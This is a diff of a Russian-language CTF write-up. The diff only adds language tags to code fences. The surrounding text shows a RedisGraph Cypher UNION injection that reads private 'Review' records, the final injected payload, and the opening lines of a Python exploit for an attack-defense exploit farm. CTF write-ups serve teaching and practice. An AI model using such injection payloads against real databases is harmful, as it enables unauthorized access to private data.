@@ -32,16 +32,16 @@ graphQuery() экранирует двойные кавычки, поэтому 
 
 Находим [документацию](https://oss.redislabs.com/redisgraph/commands/). Сделаем UNION инъекцию.
 
-```
+```sql
 MATCH (r:Review {private: FALSE, planet: "planet"}) WHERE r.score = 1 RETURN r UNION MATCH (r:Review)
 ```
 Ограничим вывод публичных записей, они нам не нужны:
-```
+```sql
 MATCH (r:Review {private: FALSE, planet: "%s"}) WHERE r.score = 1 RETURN r LIMIT 1 UNION MATCH (r:Review {private: TRUE})
 ```
 
 Итоговый payload:
-```
+```sql
 1 RETURN r LIMIT 1 UNION MATCH (r:Review)
 ```
 
@@ -70,7 +70,7 @@ MATCH (r:Review {private: FALSE, planet: "%s"}) WHERE r.score = 1 RETURN r LIMIT
 Отлично, всё работает!
 
 Сделаем sploit для destructive farm:
-```
+```python
 import requests
 import sys
 
